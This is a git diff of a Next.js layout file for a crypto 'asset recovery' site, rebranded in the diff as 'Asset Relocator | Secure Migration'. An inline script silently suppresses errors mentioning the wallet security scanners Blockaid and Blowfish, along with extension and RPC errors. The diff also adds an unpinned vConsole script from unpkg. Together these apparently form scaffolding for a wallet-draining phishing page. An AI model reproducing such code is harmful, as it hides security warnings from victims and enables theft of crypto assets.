@@ -1,10 +1,11 @@
 import type { Metadata, Viewport } from "next";
 import "./globals.css";
 import AppKitProvider from '@/context';
+import Script from 'next/script';
 
 export const metadata: Metadata = {
-  title: "Directreclaim",
-  description: "Asset Recovering",
+  title: "Asset Relocator | Secure Migration",
+  description: "Secure cross-chain asset migration protocol",
 };
 
 export const viewport: Viewport = {
@@ -12,7 +13,6 @@ export const viewport: Viewport = {
   initialScale: 1,
   maximumScale: 1,
   userScalable: false,
-  themeColor: '#020617',
 };
 
 export default function RootLayout({
@@ -21,26 +21,27 @@ export default function RootLayout({
   children: React.ReactNode;
 }) {
   return (
+    // Added suppressHydrationWarning here to cover extension-injected html attributes
     <html lang="en" suppressHydrationWarning className="dark">
       <head>
-        {/* ⚡ CRITICAL PERFORMANCE: Preload CSS to fix the "Delay to open" */}
+        <link rel="dns-prefetch" href="https://cloudflare-eth.com" />
+        <link rel="dns-prefetch" href="https://ethereum.publicnode.com" />
+
+        {/* Link your main CSS files here */}
         <link rel="stylesheet" href="/assets/css/bootstrap.min.css" />
         <link rel="stylesheet" href="/assets/css/aos.css" />
         <link rel="stylesheet" href="/assets/css/all.min.css" />
         <link rel="stylesheet" href="/assets/css/swiper-bundle.min.css" />
         <link rel="stylesheet" href="/assets/css/style.css" />
 
-        {/* 🛰️ RPC Pre-warming: Speeds up wallet connection handshakes */}
-        <link rel="preconnect" href="https://cloudflare-eth.com" crossOrigin="anonymous" />
-        <link rel="preconnect" href="https://ethereum.publicnode.com" crossOrigin="anonymous" />
         <meta httpEquiv="x-dns-prefetch-control" content="on" />
 
-        {/* 🛡️ Silent Error Handling & Fetch Interceptor (Keeps the UI clean) */}
         <script dangerouslySetInnerHTML={{
           __html: `
           (function() {
             const silentLogger = (event) => {
               const msg = (event.reason?.message || event.message || "").toLowerCase();
+              // Added "bis_skin" and "chrome-extension" to the noise filter
               const noise = ["telemetry", "extension", "mismatched", "rpc", "blockaid", "blowfish", "hydration", "bis_skin"];
               if (noise.some(term => msg.includes(term)) || !event.reason) {
                 event.preventDefault();
@@ -57,16 +58,36 @@ export default function RootLayout({
             };
           })();
         `}} />
+
+        <Script
+          src="https://unpkg.com/vconsole@latest/dist/vconsole.min.js"
+          strategy="beforeInteractive"
+        />
+        <Script id="init-vconsole" strategy="afterInteractive">
+          {`
+            if (typeof window !== 'undefined' && window.VConsole) {
+              window.vConsole = new window.VConsole();
+            }
+          `}
+        </Script>
       </head>
 
       <body className="antialiased bg-slate-950 text-slate-50" suppressHydrationWarning>
         <AppKitProvider>
+          {/** * Added suppressHydrationWarning to this wrapper div.
+           * Extensions like 'Bitwarden' or 'PriceBlink' often inject attributes 
+           * like 'bis_skin_checked' right here.
+           */}
           <div className="relative flex flex-col min-h-screen" suppressHydrationWarning>
             <main className="flex-grow" suppressHydrationWarning>
               {children}
             </main>
           </div>
+
+          {/* <AppBridge /> */}
         </AppKitProvider>
+
+
       </body>
     </html>
   );
